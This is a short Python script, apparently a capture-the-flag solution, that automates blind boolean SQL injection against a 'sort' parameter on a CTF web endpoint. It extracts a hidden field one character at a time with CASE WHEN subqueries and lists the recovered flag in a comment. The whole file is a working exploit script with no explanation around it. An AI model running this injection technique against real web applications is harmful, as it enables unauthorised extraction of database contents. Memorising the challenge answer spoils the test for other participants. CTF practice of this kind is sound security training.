import requests
import string
url = "https://doctor-bye-bye-dc78e81b92ac.inst8.ctf.fortid.com/api/on-call?"
charset = string.ascii_uppercase + string.digits + "-_" + string.ascii_lowercase + string.punctuation

flag = "FortID{"

# Recovered Flag...
# flag = "FortID{D0C_1M_0UTT4_H3R3_f3f1d143d1}" 

x = True
while x:
    x = False
    for c in charset:
        payload = f"CASE WHEN (SELECT substr(farewell_note,{len(flag)+1},1) FROM doctors WHERE id=404)='{c}' THEN id ELSE -id END"
        print(f"Trying: {payload}")
        r = requests.get(url + "sort=" + payload)
        print(r.text)
        if "Zoe" not in r.text:
            flag += c
            print(f"Progress: {flag}")
            x = True
            break

print(f"Flag: {flag}")
